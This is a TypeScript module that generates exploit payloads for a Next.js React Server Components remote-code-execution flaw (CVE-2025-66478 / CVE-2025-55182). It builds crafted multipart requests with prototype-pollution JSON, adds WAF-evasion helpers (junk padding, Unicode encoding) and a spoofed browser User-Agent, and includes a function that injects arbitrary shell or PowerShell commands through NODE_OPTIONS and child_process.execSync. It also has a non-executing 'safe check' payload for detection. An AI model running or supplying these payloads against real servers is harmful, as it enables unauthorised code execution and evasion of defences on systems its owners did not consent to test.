/**
 * Payload Generation for Next.js CVE-2025-66478 / CVE-2025-55182
 *
 * The vulnerability exploits React Server Components (RSC) through
 * crafted multipart POST requests that trigger prototype pollution
 * and ultimately achieve Remote Code Execution.
 */

/**
 * Generate a random boundary for multipart requests
 */
export function generateBoundary(): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '----WebKitFormBoundary';
  for (let i = 0; i < 16; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

/**
 * Generate WAF bypass junk data
 */
export function generateJunkData(sizeKB: number = 128): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  const targetSize = sizeKB * 1024;
  let junk = '';
  for (let i = 0; i < targetSize; i++) {
    junk += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return junk;
}

/**
 * Encode payload to Unicode for WAF bypass
 */
export function unicodeEncode(payload: string): string {
  return payload
    .split('')
    .map(char => {
      const code = char.charCodeAt(0);
      if (code > 127) {
        return char;
      }
      return `\\u${code.toString(16).padStart(4, '0')}`;
    })
    .join('');
}

/**
 * The RCE detection payload
 * Uses a deterministic math operation: 41 * 271 = 11111
 * If vulnerable, the result appears in X-Action-Redirect header as /login?a=11111
 */
export interface RCEPayload {
  boundary: string;
  contentType: string;
  body: string;
  expectedResult: string;
}

/**
 * Generate the RCE proof-of-concept payload
 * This payload executes: 41 * 271 = 11111
 */
export function generateRCEPayload(options: {
  wafBypass?: boolean;
  wafBypassSize?: number;
  useUnicode?: boolean;
  isWindows?: boolean;
} = {}): RCEPayload {
  const boundary = generateBoundary();
  const expectedResult = '11111';

  // The core exploit payload - prototype pollution via React Server Actions
  // This creates a serialized object that when deserialized executes code
  const actionPayload = JSON.stringify({
    "0": {
      "__proto__": {
        "constructor": {
          "prototype": {
            "redirect": `/login?a=\${41*271}`
          }
        }
      }
    }
  });

  let payloadBody = actionPayload;

  // Apply Unicode encoding for WAF bypass if requested
  if (options.useUnicode) {
    payloadBody = unicodeEncode(payloadBody);
  }

  // Build the multipart form data
  let body = '';

  // Add WAF bypass junk data as first part if requested
  if (options.wafBypass) {
    const junkSize = options.wafBypassSize || 128;
    body += `--${boundary}\r\n`;
    body += `Content-Disposition: form-data; name="junk"\r\n\r\n`;
    body += generateJunkData(junkSize);
    body += '\r\n';
  }

  // The action ID part - triggers server action processing
  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="1_$ACTION_ID"\r\n\r\n`;
  body += '$$ACTION_1\r\n';

  // The payload part - contains the prototype pollution payload
  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="1_$ACTION_DATA"\r\n`;
  body += `Content-Type: application/json\r\n\r\n`;
  body += payloadBody + '\r\n';

  // Close the multipart form
  body += `--${boundary}--\r\n`;

  return {
    boundary,
    contentType: `multipart/form-data; boundary=${boundary}`,
    body,
    expectedResult
  };
}

/**
 * Generate a safe check payload that doesn't execute code
 * Relies on side-channel indicators (500 status with specific error digest)
 */
export function generateSafeCheckPayload(): RCEPayload {
  const boundary = generateBoundary();

  // Malformed payload that triggers error without code execution
  let body = '';
  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="1_$ACTION_ID"\r\n\r\n`;
  body += '$$ACTION_INVALID_TEST\r\n';
  body += `--${boundary}--\r\n`;

  return {
    boundary,
    contentType: `multipart/form-data; boundary=${boundary}`,
    body,
    expectedResult: 'error_digest' // Look for specific error patterns
  };
}

/**
 * Generate headers for the exploit request
 */
export function generateHeaders(payload: RCEPayload): Record<string, string> {
  return {
    'Content-Type': payload.contentType,
    'Accept': 'text/x-component',
    'Next-Action': '$$ACTION_1',
    'Next-Router-State-Tree': '%5B%22%22%2C%7B%7D%5D',
    'RSC': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  };
}

/**
 * Command execution payloads (for authorized testing only)
 */
export function generateCommandPayload(command: string, isWindows: boolean = false): string {
  const boundary = generateBoundary();

  let execPayload: string;
  if (isWindows) {
    // PowerShell execution for Windows
    execPayload = JSON.stringify({
      "0": {
        "__proto__": {
          "constructor": {
            "prototype": {
              "env": {
                "NODE_OPTIONS": `--require child_process --eval "require('child_process').execSync('powershell -c ${command.replace(/'/g, "\\'")}')"`
              }
            }
          }
        }
      }
    });
  } else {
    // Unix shell execution
    execPayload = JSON.stringify({
      "0": {
        "__proto__": {
          "constructor": {
            "prototype": {
              "env": {
                "NODE_OPTIONS": `--require child_process --eval "require('child_process').execSync('${command.replace(/'/g, "\\'")}')"`
              }
            }
          }
        }
      }
    });
  }

  let body = '';
  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="1_$ACTION_ID"\r\n\r\n`;
  body += '$$ACTION_1\r\n';
  body += `--${boundary}\r\n`;
  body += `Content-Disposition: form-data; name="1_$ACTION_DATA"\r\n`;
  body += `Content-Type: application/json\r\n\r\n`;
  body += execPayload + '\r\n';
  body += `--${boundary}--\r\n`;

  return body;
}
